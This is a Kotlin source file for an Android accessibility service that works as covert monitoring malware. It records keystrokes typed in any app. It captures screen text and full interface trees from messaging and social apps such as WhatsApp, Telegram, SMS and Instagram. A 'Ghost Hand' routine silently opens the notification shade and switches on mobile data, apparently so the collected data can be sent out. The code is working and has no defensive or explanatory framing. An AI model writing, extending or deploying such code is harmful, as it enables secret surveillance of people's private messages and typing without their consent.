package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second

    // TREE SCRAPER STATE
    private var treeDumpEndTime = 0L
    private var targetDumpPkg: String? = null

    fun startTreeDump(pkg: String?, mins: Long) {
        targetDumpPkg = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
        treeDumpEndTime = System.currentTimeMillis() + (mins * 60 * 1000)
        DebugLogger.log("TREE", "Scraper Started for $mins mins (Target: ${targetDumpPkg ?: "ALL"})")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- 1.5 TREE SCRAPER ENGINE ---
        val now = System.currentTimeMillis()
        if (now < treeDumpEndTime) {
            if (targetDumpPkg == null || targetDumpPkg == pkgName) {
                val root = rootInActiveWindow
                if (root != null) {
                    val treeJson = serializeNode(root)
                    val wrapper = JSONObject()
                    wrapper.put("pkg", pkgName)
                    wrapper.put("ts", now)
                    wrapper.put("tree", treeJson)
                    DumpManager.appendLog("TREE", wrapper)
                }
            }
        }

        // --- 2. STANDARD MONITORING ---
        if (now < nextAllowedCheck) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        // THROTTLE: Prevent high CPU usage during scrolling
        if (now - lastScreenRead < READ_DELAY) return
        lastScreenRead = now

        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val pm = packageManager
            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            val historyStr = prefs.getString("text_history_by_app", "{}")
            val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
            val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

            val newTxt = textContent.take(100).toString()
            val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
            
            if (newTxt != lastTxt) {
                nextAllowedCheck = now + 500
                
                // 1. STREAM LOGGING (NO LAG)
                val entry = JSONObject()
                entry.put("pkg", appName)
                entry.put("ts", now)
                entry.put("txt", newTxt)
                DumpManager.appendLog("SCREEN", entry)
                
                // 2. Update Stats
                prefs.edit()
                    .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                    .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                    .apply()

                // 3. Verify
                DumpManager.logVerification("READER", pkgName)
            } else {
                nextAllowedCheck = now + 3000
            }
        }
    }

    fun engageGhostHand() {
        DebugLogger.log("GHOST", "Engaging Ghost Hand for Data Recovery...")
        isGhostActive = true
        val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        if (km.isKeyguardLocked) {
            DebugLogger.log("GHOST", "Device Locked. Waiting for user...")
            return
        }
        performSwipeDown()
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        if (isGhostActive && !isLookingForToggle) {
             val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
             if (!km.isKeyguardLocked) performSwipeDown()
        }

        if (isLookingForToggle && event.packageName == "com.android.systemui") {
            val root = rootInActiveWindow ?: return
            if (findAndClickToggle(root)) {
                Handler(Looper.getMainLooper()).postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 300)
                isGhostActive = false
                isLookingForToggle = false
            }
        }
    }

    private fun performSwipeDown() {
        if (!isLookingForToggle) {
            isLookingForToggle = true
            performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
        }
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        val text = (node.text ?: node.contentDescription ?: "").toString()
        if (targetKeywords.any { text.contains(it, ignoreCase = true) }) {
            var clickableNode = node
            while (!clickableNode.isClickable && clickableNode.parent != null) clickableNode = clickableNode.parent
            if (clickableNode.isClickable) {
                clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
        }
        for (i in 0 until node.childCount) {
            if (findAndClickToggle(node.getChild(i))) return true
        }
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    private fun serializeNode(node: AccessibilityNodeInfo?): JSONObject? {
        if (node == null) return null
        val json = JSONObject()
        try {
            json.put("class", node.className)
            json.put("text", node.text)
            json.put("desc", node.contentDescription)
            json.put("id", node.viewIdResourceName)
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i))
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    override fun onInterrupt() {}

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
